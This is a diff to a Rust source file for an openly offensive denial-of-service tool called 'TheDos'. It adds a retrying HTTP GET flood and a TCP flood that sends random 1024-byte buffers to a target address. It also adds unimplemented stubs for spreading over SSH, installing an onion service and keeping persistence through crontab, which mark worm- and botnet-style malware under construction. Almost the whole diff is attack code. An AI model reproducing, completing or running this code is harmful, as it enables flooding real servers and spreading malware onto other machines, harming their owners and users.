@@ -10,6 +10,8 @@
 
 
 
+
+
 use crate::*;
 
 
@@ -28,19 +30,20 @@ use crate::*;
 pub struct TheDos{
     pub flag: u8,
     pub safe: u8,
-    pub retries: u128,
+    pub retries: usize,
     pub status_code: u16,
     pub host: Option<String>,
     pub url: Option<String>,
     pub tcp_addr: Option<String>,
     pub udp_addr: Option<String>,
+    pub n_workers: usize,
 }
 
 
 impl TheDos{
 
 
-    pub fn new(url: Option<String>, tcp_addr: Option<String>, udp_addr: Option<String>, host: Option<String>) -> Self{
+    pub fn new(url: Option<String>, tcp_addr: Option<String>, udp_addr: Option<String>, host: Option<String>, n_workers: usize) -> Self{
         Self{
             flag: 0,
             safe: 0,
@@ -50,6 +53,7 @@ impl TheDos{
             url,
             tcp_addr,
             udp_addr,
+            n_workers,
         }
     }
 
@@ -73,6 +77,21 @@ pub fn gen_random_number(from: u32, to: u32) -> u32{
 
 impl TheDos{
 
+
+    pub fn spread(&self) -> Result<Self, utils::Error>{
+        // ssh uploading
+        todo!()
+    }
+
+    pub fn install(&self) -> Result<Self, utils::Error>{
+        // build configs and run the onion 
+        todo!()
+    }
+
+    pub fn persistence(&mut self) -> Result<Self, utils::Error>{
+        // crontab
+        todo!()
+    }
 
     pub fn build_user_agents(&self) -> Vec<&'static str>{ // use 'static lifetime in order to be able to return &str from the function since rust doesn't allow to return reference by default unless the return type has a valid and defined lifetime
         let mut user_agents = Vec::<&str>::new();
@@ -106,13 +125,9 @@ impl TheDos{
     }
     
     
+    
+    pub async fn send_get(&mut self) -> Result<Response<Body>, hyper::Error>{
 
-    /////////////////////////////////////////////////////////////////////////////
-    //////////////////////////////// HTTP ATTACK ////////////////////////////////
-    /////////////////////////////////////////////////////////////////////////////
-
-    pub async fn httpcall(&mut self){ // url is &str thus we don't need to clone it since its sized
-        
         let param_joiner = if self.url.as_ref().unwrap().as_str().matches("&").count() > 0{ // can't move self.url since it's behind a mutable reference thus we have to either borrow it using as_ref() method or clone it
             "&"
         } else{
@@ -147,29 +162,37 @@ impl TheDos{
         // we don't need to be sequential thus we must have joinhanle tasks: https://www.fpcomplete.com/blog/http-status-codes-async-rust/
         // let res = block_on(client.request(req)).unwrap(); 
         
-        info!("sending GET of {} to {} for {} times", uri, self.url.as_ref().unwrap(), self.retries);
-        
+        println!("sending GET of {} to {} at time {} | {} retries", uri, self.url.as_ref().unwrap(), chrono::Local::now(), self.retries);
+
         // first it'll create a hyper request process object during the loop and run the rest of the code without blocking 
         // then await on each of them asyncly to send those created request object to the target host  
         // finally it'll check the response comming back from the target for each result.
-        let res = client.request(req).await; 
+        self.retries+=1;
+        client.request(req).await
 
+
+    }
+
+
+    
+    /////////////////////////////////////////////////////////////////////////////
+    //////////////////////////////// HTTP ATTACK ////////////////////////////////
+    /////////////////////////////////////////////////////////////////////////////
+
+    pub async fn httpcall(&mut self){ // url is &str thus we don't need to clone it since its sized
         
-        if let Err(e) = res{
-            error!("can't send to {} due to {}", self.url.as_ref().unwrap(), e);
-            process::exit(1);
-        } else {
-            
-            let res = res.unwrap();
-            if res.status() == 500{
-                self.flag = 1;
-                self.status_code = 500;
-                process::exit(1);
-            } else{
-                self.retries+=1;
+        
+        let mut res = self.send_get().await;
+
+        while let Err(e) = res{
+            eprintln!("can't send to {} at {} due to {}", self.url.as_ref().unwrap(), chrono::Local::now(), e);
+            println!("retring send get at {}", chrono::Local::now());
+            res = self.send_get().await; // send the get untill all workers get finished
+            if self.retries >= self.n_workers{
+                process::exit(1); // reached the maximum workers
             }
-                
-        }
+        } 
+        
     
     }
     
@@ -191,13 +214,13 @@ impl TheDos{
                 match TcpStream::connect(tcp_addr.as_str()).await{
                     Ok(mut stream) => {
     
-                        info!("sending packet {}", time);
+                        println!("sending packet at {} | retries {}", chrono::Local::now(), time);
                         let random_bytes: Vec<u8> = (0..1024).map(|_| { rand::random::<u8>() }).collect(); // generating a random buffer with size 1024 bytes
                         stream.write_all(&random_bytes).await.unwrap(); // sending buffer to the target host 
     
                     },
                     Err(e) => {
-                        error!(": {}", e);
+                        eprintln!(": {} at {}", e, chrono::Local::now());
                     }
                 }
             });  
@@ -227,6 +250,7 @@ impl TheDos{
     
     pub async fn dnscall(&mut self){
         
+        // iptables o ina
         todo!();
     }
 
